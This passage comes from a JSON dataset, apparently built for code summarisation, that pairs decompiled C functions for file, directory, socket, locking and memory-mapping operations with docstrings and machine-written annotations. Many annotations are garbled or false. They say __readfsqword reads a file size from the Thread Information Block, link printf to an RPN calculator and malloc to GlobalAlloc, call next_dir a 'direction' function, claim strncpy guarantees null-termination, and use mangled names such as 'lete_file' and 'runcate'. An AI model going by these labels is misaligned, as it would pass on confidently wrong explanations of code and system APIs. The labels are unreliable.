        "longer_label": "The provided code defines a function named `has_next` which takes an argument `a1`, presumably representing a directory stream, and uses `readdir64_r` to attempt to read the next entry from the directory, returning true if there is a next entry and false otherwise."
    },
    {
        "id": 430,
        "docstring_tokens": [
            "The",
            "next_dir",
            "function",
            "sets",
            "the",
            "type",
            "of",
            "a",
            "directory",
            "entry",
            "based",
            "on",
            "the",
            "type",
            "of",
            "the",
            "unix",
            "dirent",
            "and",
            "copies",
            "the",
            "name",
            "of",
            "the",
            "dirent",
            "to",
            "the",
            "entry",
            "."
        ],
        "code_tokens": [
            "int",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "__int64",
            "a2",
            ")",
            "{",
            "int",
            "result",
            ";",
            "int",
            "v3",
            ";",
            "__int64",
            "v4",
            ";",
            "if",
            "(",
            "!",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "16",
            ")",
            ")",
            "return",
            "fprintf",
            "(",
            "stderr",
            ",",
            "\"%s\\n\"",
            ",",
            "\"Error: has_next must be called at least once befor next_dir\"",
            ")",
            ";",
            "v4",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "16",
            ")",
            ";",
            "v3",
            "=",
            "*",
            "(",
            "unsigned",
            "__int8",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "18",
            ")",
            ";",
            "if",
            "(",
            "v3",
            "=",
            "=",
            "4",
            ")",
            "{",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "a2",
            "=",
            "1",
            ";",
            "}",
            "else",
            "if",
            "(",
            "v3",
            "=",
            "=",
            "8",
            ")",
            "{",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "a2",
            "=",
            "0",
            ";",
            "}",
            "else",
            "{",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "a2",
            "=",
            "2",
            ";",
            "}",
            "strncpy",
            "(",
            "(",
            "char",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "4",
            ")",
            ",",
            "(",
            "const",
            "char",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "19",
            ")",
            ",",
            "0x100uL",
            "L",
            ")",
            ";",
            "result",
            "=",
            "a2",
            ";",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "259",
            ")",
            "=",
            "0",
            ";",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `printf` is a custom implementation, likely derived from C's standard `printf` function, used in a Reverse Polish Notation (RPN) calculator program with additional functionality for formatting floating-point numbers and handling special cases like positive/negative infinity and NaN.",
            "The `strncpy` function is used to copy at most `n` characters from the source string to the destination string, ensuring null-termination and preventing buffer overflow by limiting the number of characters copied."
        ],
        "longer_label": "The code is a function called \"next_dir\" which returns the next direction based on certain conditions and copies a string, with error handling using a custom implementation of printf and preventing buffer overflow using strncpy."
    },
    {
        "id": 431,
        "docstring_tokens": [
            "The",
            "function",
            "open_file",
            "takes",
            "a",
            "file",
            "path",
            ",",
            "mode",
            ",",
            "and",
            "error",
            "pointer",
            "as",
            "inputs",
            ",",
            "determines",
            "the",
            "appropriate",
            "flags",
            "based",
            "on",
            "the",
            "mode",
            "(",
            "READ",
            ",",
            "WRITE",
            ",",
            "CREATE",
            ")",
            "and",
            "opens",
            "the",
            "file",
            "with",
            "the",
            "specified",
            "flags",
            "and",
            "permissions",
            ",",
            "returning",
            "the",
            "file",
            "descriptor",
            "or",
            "setting",
            "the",
            "error",
            "code",
            "if",
            "the",
            "file",
            "can",
            "not",
            "be",
            "opened",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "const",
            "char",
            "*",
            "a1",
            ",",
            "char",
            "a2",
            ",",
            "_DWORD",
            "*",
            "a3",
            ")",
            "{",
            "int",
            "oflag",
            ";",
            "unsigned",
            "int",
            "v6",
            ";",
            "int",
            "v7",
            ";",
            "oflag",
            "=",
            "0",
            ";",
            "*",
            "a3",
            "=",
            "0",
            ";",
            "if",
            "(",
            "(",
            "a2",
            "&",
            "1",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "a2",
            "&",
            "2",
            ")",
            "!",
            "=",
            "0",
            ")",
            "{",
            "oflag",
            "=",
            "2",
            ";",
            "}",
            "else",
            "if",
            "(",
            "(",
            "a2",
            "&",
            "1",
            ")",
            "!",
            "=",
            "0",
            ")",
            "{",
            "oflag",
            "=",
            "0",
            ";",
            "}",
            "else",
            "if",
            "(",
            "(",
            "a2",
            "&",
            "2",
            ")",
            "!",
            "=",
            "0",
            ")",
            "{",
            "oflag",
            "=",
            "1",
            ";",
            "}",
            "v6",
            "=",
            "0",
            ";",
            "if",
            "(",
            "(",
            "a2",
            "&",
            "4",
            ")",
            "!",
            "=",
            "0",
            ")",
            "{",
            "oflag",
            "|",
            "=",
            "0x40u",
            ";",
            "v6",
            "=",
            "420",
            ";",
            "}",
            "v7",
            "=",
            "open64",
            "(",
            "a1",
            ",",
            "oflag",
            ",",
            "v6",
            ")",
            ";",
            "if",
            "(",
            "v7",
            ">",
            "=",
            "0",
            ")",
            "return",
            "(",
            "unsigned",
            "int",
            ")",
            "v7",
            ";",
            "*",
            "a3",
            "=",
            "get_err",
            "(",
            ")",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `get_err` appears to be designed to retrieve error messages or descriptions within various contexts, such as in PHP extension development or shell script handling, likely returning error messages or codes encountered during execution."
        ],
        "longer_label": "The `open_file` function takes a file path, a flag indicating file access mode, and a pointer for error handling, determining the file opening mode based on the flags provided, including options for read-only, write-only, or read/write access with additional options for creating or truncating files, and utilizes `open64` to attempt file opening, returning the file descriptor or an error code if unsuccessful, potentially with the aid of a `get_err` function for error retrieval."
    },
    {
        "id": 432,
        "docstring_tokens": [
            "The",
            "code",
            "creates",
            "a",
            "temporary",
            "file",
            "with",
            "a",
            "random",
            "name",
            "in",
            "the",
            "specified",
            "path",
            "and",
            "returns",
            "the",
            "file",
            "descriptor",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "const",
            "char",
            "*",
            "a1",
            ")",
            "{",
            "size_t",
            "v1",
            ";",
            "unsigned",
            "int",
            "v3",
            ";",
            "char",
            "*",
            "templatea",
            ";",
            "_WORD",
            "v5",
            "[",
            "9",
            "]",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "v5",
            "[",
            "5",
            "]",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "strcpy",
            "(",
            "(",
            "char",
            "*",
            ")",
            "v5",
            ",",
            "\"tmpXXXXXX\"",
            ")",
            ";",
            "v1",
            "=",
            "strlen",
            "(",
            "a1",
            ")",
            ";",
            "templatea",
            "=",
            "(",
            "char",
            "*",
            ")",
            "malloc",
            "(",
            "v1",
            "+",
            "11",
            ")",
            ";",
            "sprintf",
            "(",
            "templatea",
            ",",
            "\"%s/%s\"",
            ",",
            "a1",
            ",",
            "(",
            "const",
            "char",
            "*",
            ")",
            "v5",
            ")",
            ";",
            "v3",
            "=",
            "mkstemp64",
            "(",
            "templatea",
            ")",
            ";",
            "unlink",
            "(",
            "templatea",
            ")",
            ";",
            "free",
            "(",
            "templatea",
            ")",
            ";",
            "return",
            "v3",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"qword\" likely deals with manipulating or processing 64-bit unsigned integers (quadwords) and may involve tasks such as arithmetic operations, bitwise operations, or memory manipulation.",
            "The provided code snippets suggest an implementation of various algorithms and data structures, along with a redefinition of the `malloc` function. This redefinition indicates the function's usage for memory allocation in a custom environment, possibly for implementing algorithms like binary search, permutation generation, tree manipulation, and Mandelbrot set computation.",
            "The function `mkstemp64` generates a unique temporary file name with a specified template, replacing the last six characters with a string to ensure uniqueness, and returns a file descriptor open for reading and writing, or -1 if it fails, primarily intended for systems where large file support is required.",
            "The `unlink` function, commonly used in Unix-style environments, is typically employed to delete a specified file from the file system."
        ],
        "longer_label": "The provided code defines a function, `create_tmp_file`, which creates a temporary file in a specified directory, using a given template and incorporating functionality for managing memory allocation and generating unique file names, primarily intended for systems requiring large file support."
    },
    {
        "id": 433,
        "docstring_tokens": [
            "The",
            "function",
            "``",
            "close_file",
            "''",
            "closes",
            "a",
            "file",
            "and",
            "returns",
            "an",
            "error",
            "code",
            "if",
            "the",
            "closing",
            "operation",
            "fails",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "int",
            "a1",
            ")",
            "{",
            "if",
            "(",
            "close",
            "(",
            "a1",
            ")",
            ")",
            "return",
            "get_err",
            "(",
            ")",
            ";",
            "else",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function named \"close\" appears to be part of a larger codebase containing C/C++ code snippets, including system calls and low-level operations, suggesting it likely handles the closing of file descriptors or resources, potentially in the context of file I/O or memory management, within a larger application or library.",
            "The function `get_err` seems to be intended to retrieve error messages or descriptions within different contexts, such as PHP extension development or shell command handling, likely providing a way to access and handle errors encountered during execution."
        ],
        "longer_label": "The provided code is a C/C++ function named `close_file` which likely closes a file descriptor or resource identified by the integer parameter `a1`, returning either an error code obtained from the `get_err` function if the `close` operation fails, or `0` if successful, within a larger codebase likely related to file I/O or memory management."
    },
    {
        "id": 434,
        "docstring_tokens": [
            "The",
            "code",
            "creates",
            "a",
            "socket",
            ",",
            "sets",
            "it",
            "up",
            "for",
            "binding",
            "to",
            "a",
            "port",
            ",",
            "and",
            "tries",
            "to",
            "bind",
            "it",
            "to",
            "the",
            "specified",
            "port",
            ",",
            "returning",
            "the",
            "file",
            "descriptor",
            "of",
            "the",
            "bound",
            "socket",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "const",
            "char",
            "*",
            "port",
            ")",
            "{",
            "int",
            "yes",
            ";",
            "addrinfo",
            "*",
            "servinfo",
            ";",
            "addrinfo",
            "hints",
            ";",
            "addrinfo",
            "*",
            "p",
            ";",
            "int",
            "fd",
            ";",
            "memset",
            "(",
            "&",
            "hints",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "hints",
            ")",
            ")",
            ";",
            "hints",
            ".",
            "ai_family",
            "=",
            "0",
            ";",
            "hints",
            ".",
            "ai_socktype",
            "=",
            "1",
            ";",
            "hints",
            ".",
            "ai_flags",
            "=",
            "1",
            ";",
            "if",
            "(",
            "getaddrinfo",
            "(",
            "0L",
            "L",
            ",",
            "port",
            ",",
            "&",
            "hints",
            ",",
            "&",
            "servinfo",
            ")",
            ")",
            "{",
            "perror",
            "(",
            "\"getaddrinfo\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "p",
            "=",
            "servinfo",
            ";",
            "while",
            "(",
            "p",
            ")",
            "{",
            "fd",
            "=",
            "socket",
            "(",
            "p",
            "-",
            ">",
            "ai_family",
            ",",
            "p",
            "-",
            ">",
            "ai_socktype",
            ",",
            "p",
            "-",
            ">",
            "ai_protocol",
            ")",
            ";",
            "if",
            "(",
            "fd",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "perror",
            "(",
            "\"server: socket\"",
            ")",
            ";",
            "}",
            "else",
            "{",
            "yes",
            "=",
            "1",
            ";",
            "if",
            "(",
            "setsockopt",
            "(",
            "fd",
            ",",
            "1",
            ",",
            "2",
            ",",
            "&",
            "yes",
            ",",
            "4u",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "perror",
            "(",
            "\"setsockopt\"",
            ")",
            ";",
            "if",
            "(",
            "bind",
            "(",
            "fd",
            ",",
            "p",
            "-",
            ">",
            "ai_addr",
            ",",
            "p",
            "-",
            ">",
            "ai_addrlen",
            ")",
            "!",
            "=",
            "-",
            "1",
            ")",
            "break",
            ";",
            "close",
            "(",
            "fd",
            ")",
            ";",
            "perror",
            "(",
            "\"server:bind\"",
            ")",
            ";",
            "}",
            "}",
            "if",
            "(",
            "!",
            "p",
            ")",
            "perror",
            "(",
            "\"Could not bind\"",
            ")",
            ";",
            "freeaddrinfo",
            "(",
            "servinfo",
            ")",
            ";",
            "return",
            "fd",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The perror function is used to print a descriptive error message to stderr based on the value of errno, typically used after system calls like write to handle errors gracefully by providing additional context."
        ],
        "longer_label": "The provided code attempts to create a socket, set socket options, and bind to a port specified by the input parameter 'port', handling errors with descriptive messages using perror, while looping through possible address information obtained via getaddrinfo until successful binding or exhaustion of options."
    },
    {
        "id": 435,
        "docstring_tokens": [
            "This",
            "code",
            "deletes",
            "a",
            "file",
            "at",
            "the",
            "specified",
            "path",
            "and",
            "returns",
            "an",
            "error",
            "code",
            "if",
            "unsuccessful",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "const",
            "char",
            "*",
            "a1",
            ")",
            "{",
            "if",
            "(",
            "unlink",
            "(",
            "a1",
            ")",
            ")",
            "return",
            "get_err",
            "(",
            ")",
            ";",
            "else",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `__ function \"__int64\" is likely used to define a 64-bit integer data type, compatible across different platforms, based on the provided code snippets.",
            "The function `lete_file` appears to be intended for deleting files and directories, encapsulating functionality related to file system operations such as deleting files, directories, renaming files, creating directories, and modifying file permissions.",
            "The function `get_err` appears to be a custom error handling function within a shell script, designed to retrieve error messages in the shell environment."
        ],
        "longer_label": "The provided code defines a function named `delete_file` which uses the `unlink` function to delete a file specified by the input path `a1`, returning 0 if successful and invoking a custom error handling function `get_err` otherwise, likely designed for file system operations."
    },
    {
        "id": 436,
        "docstring_tokens": [
            "This",
            "code",
            "retrieves",
            "the",
            "size",
            "of",
            "a",
            "file",
            "specified",
            "by",
            "the",
            "path",
            "and",
            "stores",
            "it",
            "in",
            "the",
            "fsize",
            "variable",
            ",",
            "returning",
            "an",
            "error",
            "code",
            "if",
            "the",
            "file",
            "can",
            "not",
            "be",
            "found",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "const",
            "char",
            "*",
            "a1",
            ",",
            "__off_t",
            "*",
            "a2",
            ")",
            "{",
            "struct",
            "stat64",
            "v3",
            ";",
            "unsigned",
            "__int64",
            "v4",
            ";",
            "v4",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "stat64",
            "(",
            "a1",
            ",",
            "&",
            "v3",
            ")",
            ")",
            "return",
            "get_err",
            "(",
            ")",
            ";",
            "*",
            "a2",
            "=",
            "v3",
            ".",
            "st_size",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is used to read a 64-bit quadword from a segment of the current thread's Thread Information Block (TIB), particularly on x86 architecture, often utilized for low-level system programming tasks such as accessing thread-local storage or processor-specific registers."
        ],
        "longer_label": "The provided code defines a function `get_file_size` that utilizes `__readfsqword` to access the Thread Information Block (TIB) to retrieve the file size of a specified file, storing the result in `a2` if successful, and returning an error code otherwise."
    },
    {
        "id": 437,
        "docstring_tokens": [
            "The",
            "function",
            "fget_file_size",
            "retrieves",
            "the",
            "size",
            "of",
            "a",
            "file",
            "and",
            "stores",
            "it",
            "in",
            "the",
            "fsize_t",
            "pointer",
            "variable",
            ",",
            "returning",
            "0",
            "if",
            "successful",
            "or",
            "an",
            "error",
            "code",
            "if",
            "not",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "int",
            "a1",
            ",",
            "__off_t",
            "*",
            "a2",
            ")",
            "{",
            "struct",
            "stat64",
            "v3",
            ";",
            "unsigned",
            "__int64",
            "v4",
            ";",
            "v4",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "fstat64",
            "(",
            "a1",
            ",",
            "&",
            "v3",
            ")",
            ")",
            "return",
            "get_err",
            "(",
            ")",
            ";",
            "*",
            "a2",
            "=",
            "v3",
            ".",
            "st_size",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `get_file` function seems to be responsible for reading and loading files from disk, possibly within a larger software system or application, using various file handling and I/O operations like opening, closing, and obtaining file sizes.",
            "The function `__readfsqword` is used to read a 64-bit quadword (8 bytes) from a specific offset in the FS segment register, typically used in low-level system programming for accessing thread information or other structured data stored in the FS segment."
        ],
        "longer_label": "The code snippet defines a function `fget_file_size` that uses `fstat64` to obtain the size of a file identified by `a1`, stores the size in `a2`, and returns 0 if successful, otherwise calling `get_err` on failure, designed for file handling and I/O operations within a larger software system."
    },
    {
        "id": 438,
        "docstring_tokens": [
            "This",
            "code",
            "locks",
            "a",
            "specified",
            "portion",
            "of",
            "a",
            "file",
            "for",
            "writing",
            ",",
            "returning",
            "an",
            "error",
            "code",
            "if",
            "unsuccessful",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "unsigned",
            "int",
            "a1",
            ",",
            "__int64",
            "a2",
            ",",
            "__int64",
            "a3",
            ")",
            "{",
            "__int16",
            "v4",
            "[",
            "4",
            "]",
            ";",
            "__int64",
            "v5",
            ";",
            "__int64",
            "v6",
            ";",
            "__pid_t",
            "v7",
            ";",
            "unsigned",
            "__int64",
            "v8",
            ";",
            "v8",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "v4",
            "[",
            "0",
            "]",
            "=",
            "1",
            ";",
            "v4",
            "[",
            "1",
            "]",
            "=",
            "0",
            ";",
            "v5",
            "=",
            "a2",
            ";",
            "v6",
            "=",
            "a3",
            ";",
            "v7",
            "=",
            "getpid",
            "(",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "fcntl64",
            "(",
            "a1",
            ",",
            "6L",
            "L",
            ",",
            "v4",
            ")",
            ")",
            "return",
            "get_err",
            "(",
            ")",
            ";",
            "else",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is likely used to read a quadword (64 bits) from a specified offset within the segment selector for the FS segment, commonly utilized in low-level system programming for accessing thread information or other specialized data structures on x86/x64 architectures."
        ],
        "longer_label": "The provided code is a function named `lock_file` which attempts to lock a file specified by the file descriptor `a1`, using the `fcntl64` system call with operation `6L`, and returns an error if the locking fails, likely utilizing low-level system programming techniques including accessing thread information through `__readfsqword`."
    },
    {
        "id": 439,
        "docstring_tokens": [
            "This",
            "function",
            "unlocks",
            "a",
            "specified",
            "file",
            "at",
            "a",
            "given",
            "offset",
            "and",
            "length",
            "by",
            "setting",
            "a",
            "lock",
            "type",
            "to",
            "F_UNLCK",
            "using",
            "fcntl",
            "(",
            ")",
            "system",
            "call",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "unsigned",
            "int",
            "a1",
            ",",
            "__int64",
            "a2",
            ",",
            "__int64",
            "a3",
            ")",
            "{",
            "__int16",
            "v4",
            "[",
            "4",
            "]",
            ";",
            "__int64",
            "v5",
            ";",
            "__int64",
            "v6",
            ";",
            "__pid_t",
            "v7",
            ";",
            "unsigned",
            "__int64",
            "v8",
            ";",
            "v8",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "v4",
            "[",
            "0",
            "]",
            "=",
            "2",
            ";",
            "v4",
            "[",
            "1",
            "]",
            "=",
            "0",
            ";",
            "v5",
            "=",
            "a2",
            ";",
            "v6",
            "=",
            "a3",
            ";",
            "v7",
            "=",
            "getpid",
            "(",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "fcntl64",
            "(",
            "a1",
            ",",
            "6L",
            "L",
            ",",
            "v4",
            ")",
            ")",
            "return",
            "get_err",
            "(",
            ")",
            ";",
            "else",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is used to read an unsigned 64-bit integer from a specific offset in the FS segment register on x86 architectures, primarily for low-level system programming or kernel development."
        ],
        "longer_label": "The code defines a function called `unlock_file` which attempts to unlock a file descriptor specified by `a1` using `fcntl64`, and returns an error code obtained from `get_err` if unsuccessful, otherwise returning 0, while utilizing low-level system functions including `__readfsqword` and `getpid`."
    },
    {
        "id": 440,
        "docstring_tokens": [
            "This",
            "code",
            "dynamically",
            "allocates",
            "memory",
            "for",
            "storing",
            "the",
            "current",
            "working",
            "directory",
            ",",
            "increasing",
            "the",
            "size",
            "of",
            "the",
            "allocated",
            "memory",
            "as",
            "needed",
            "until",
            "the",
            "directory",
            "path",
            "can",
            "be",
            "successfully",
            "retrieved",
            "."
        ],
        "code_tokens": [
            "char",
            "*",
            "FUN0",
            "(",
            ")",
            "{",
            "char",
            "*",
            "i",
            ";",
            "int",
            "v2",
            ";",
            "char",
            "*",
            "ptr",
            ";",
            "v2",
            "=",
            "64",
            ";",
            "ptr",
            "=",
            "(",
            "char",
            "*",
            ")",
            "malloc",
            "(",
            "0x40uL",
            "L",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "getcwd",
            "(",
            "ptr",
            ",",
            "0x40uL",
            "L",
            ")",
            ";",
            "!",
            "i",
            "&",
            "&",
            "*",
            "_errno_location",
            "(",
            ")",
            "=",
            "=",
            "34",
            ";",
            "i",
            "=",
            "getcwd",
            "(",
            "ptr",
            ",",
            "v2",
            ")",
            ")",
            "{",
            "v2",
            "*",
            "=",
            "2",
            ";",
            "ptr",
            "=",
            "(",
            "char",
            "*",
            ")",
            "realloc",
            "(",
            "ptr",
            ",",
            "v2",
            ")",
            ";",
            "}",
            "return",
            "ptr",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `malloc` function is typically used for dynamic memory allocation in C programs, allowing memory to be allocated at runtime, as demonstrated by the provided code snippets which define a custom `malloc` function that allocates memory using `GlobalAlloc` and manages memory for various data structures like trees and arrays.",
            "The function `realloc` is used for dynamically resizing memory blocks allocated by `malloc`, `calloc`, or previously reallocated with `realloc`, allowing for efficient memory management in C programs."
        ],
        "longer_label": "The provided code defines a custom function `get_cwd` in C that dynamically allocates memory to store the current working directory, increasing the allocation size exponentially until the directory path can be successfully retrieved."
    },
    {
        "id": 441,
        "docstring_tokens": [
            "This",
            "code",
            "attempts",
            "to",
            "rename",
            "a",
            "file",
            "specified",
            "by",
            "its",
            "old",
            "path",
            "to",
            "a",
            "new",
            "path",
            "and",
            "returns",
            "an",
            "error",
            "code",
            "if",
            "unsuccessful",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "const",
            "char",
            "*",
            "a1",
            ",",
            "const",
            "char",
            "*",
            "a2",
            ")",
            "{",
            "if",
            "(",
            "rename",
            "(",
            "a1",
            ",",
            "a2",
            ")",
            ")",
            "return",
            "get_err",
            "(",
            ")",
            ";",
            "else",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function get_err is used to retrieve error messages within a C program, allowing for easier error handling and debugging."
        ],
        "longer_label": "The provided code is a C function named `rename_file` which attempts to rename a file specified by the first argument to the name specified by the second argument, returning 0 if successful or an error code obtained from the `get_err` function if the renaming operation fails."
    },
    {
        "id": 442,
        "docstring_tokens": [
            "The",
            "function",
            "``",
            "get_err",
            "''",
            "returns",
            "an",
            "error",
            "code",
            "based",
            "on",
            "the",
            "value",
            "of",
            "the",
            "``",
            "errno",
            "''",
            "variable",
            "."
        ],
        "code_tokens": [
            "__int64",
            "FUN0",
            "(",
            ")",
            "{",
            "int",
            "v0",
            ";",
            "v0",
            "=",
            "*",
            "_errno_location",
            "(",
            ")",
            ";",
            "if",
            "(",
            "v0",
            "=",
            "=",
            "36",
            ")",
            "return",
            "4L",
            "L",
            ";",
            "if",
            "(",
            "v0",
            "<",
            "=",
            "36",
            ")",
            "{",
            "if",
            "(",
            "v0",
            "=",
            "=",
            "20",
            ")",
            "return",
            "3L",
            "L",
            ";",
            "if",
            "(",
            "v0",
            "<",
            "=",
            "20",
            ")",
            "{",
            "if",
            "(",
            "v0",
            "=",
            "=",
            "2",
            ")",
            "return",
            "1L",
            "L",
            ";",
            "if",
            "(",
            "v0",
            "=",
            "=",
            "13",
            ")",
            "return",
            "2L",
            "L",
            ";",
            "}",
            "}",
            "return",
            "5L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The code is a function named `get_err` which returns an integer value indicating the error type based on the value of the `errno` variable, with annotations provided for clarification."
    },
    {
        "id": 443,
        "docstring_tokens": [
            "This",
            "code",
            "creates",
            "a",
            "memory",
            "map",
            "based",
            "on",
            "the",
            "specified",
            "file",
            ",",
            "length",
            ",",
            "flags",
            ",",
            "and",
            "mode",
            ",",
            "returning",
            "NULL",
            "if",
            "the",
            "length",
            "is",
            "negative",
            "or",
            "if",
            "an",
            "error",
            "occurs",
            "during",
            "the",
            "mapping",
            "process",
            "."
        ],
        "code_tokens": [
            "_QWORD",
            "*",
            "FUN0",
            "memory_map",
            "(",
            "unsigned",
            "int",
            "a1",
            ",",
            "__int64",
            "a2",
            ",",
            "char",
            "a3",
            ",",
            "int",
            "a4",
            ")",
            "{",
            "int",
            "fd",
            ";",
            "int",
            "prot",
            ";",
            "int",
            "flags",
            ";",
            "__int64",
            "v10",
            ";",
            "void",
            "*",
            "addr",
            ";",
            "_QWORD",
            "*",
            "v12",
            ";",
            "unsigned",
            "__int64",
            "v13",
            ";",
            "fd",
            "=",
            "a1",
            ";",
            "v13",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "a2",
            "<",
            "0",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "fget_file_size",
            "(",
            "a1",
            ",",
            "&",
            "v10",
            ")",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "if",
            "(",
            "a2",
            ">",
            "v10",
            "&",
            "&",
            "(",
            "a3",
            "&",
            "4",
            ")",
            "=",
            "=",
            "0",
            "&",
            "&",
            "ftruncate64",
            "(",
            "a1",
            ",",
            "a2",
            ")",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "prot",
            "=",
            "(",
            "a3",
            "&",
            "1",
            ")",
            "!",
            "=",
            "0",
            ";",
            "if",
            "(",
            "(",
            "a3",
            "&",
            "2",
            ")",
            "!",
            "=",
            "0",
            ")",
            "prot",
            "|",
            "=",
            "2u",
            ";",
            "flags",
            "=",
            "0",
            ";",
            "if",
            "(",
            "(",
            "a3",
            "&",
            "4",
            ")",
            "!",
            "=",
            "0",
            ")",
            "{",
            "flags",
            "=",
            "32",
            ";",
            "fd",
            "=",
            "-",
            "1",
            ";",
            "}",
            "if",
            "(",
            "a4",
            "=",
            "=",
            "1",
            ")",
            "{",
            "flags",
            "|",
            "=",
            "2u",
            ";",
            "}",
            "else",
            "if",
            "(",
            "!",
            "a4",
            ")",
            "{",
            "flags",
            "|",
            "=",
            "1u",
            ";",
            "}",
            "addr",
            "=",
            "mmap64",
            "(",
            "0L",
            "L",
            ",",
            "a2",
            ",",
            "prot",
            ",",
            "flags",
            ",",
            "fd",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "addr",
            "=",
            "=",
            "(",
            "void",
            "*",
            ")",
            "-",
            "1L",
            "L",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "v12",
            "=",
            "malloc",
            "(",
            "0x10uL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v12",
            ")",
            "{",
            "v12",
            "[",
            "1",
            "]",
            "=",
            "a2",
            ";",
            "*",
            "v12",
            "=",
            "addr",
            ";",
            "return",
            "v12",
            ";",
            "}",
            "else",
            "{",
            "munmap",
            "(",
            "addr",
            ",",
            "a2",
            ")",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function __readfsq is used to read the value stored in the FS segment register on x86 architecture, typically used for accessing thread-local storage or security-related data structures in the Windows operating system.",
            "The function `fget_file` seems to be intended to retrieve a `FILE*` object associated with a given file descriptor from the kernel's file descriptor table.",
            "The `runcate` function appears to be part of a file system operation, likely involved in truncating (shortening) files, with the `fs_truncate` function being a related function performing file truncation based on a given file name and length.",
            "The function `malloc` is a memory allocation function typically used in C programming to dynamically allocate memory for a specified number of bytes, here, it's redefined to utilize `GlobalAlloc` with `GMEM_ZEROINIT` flag indicating zero-initialized memory allocation."
        ],
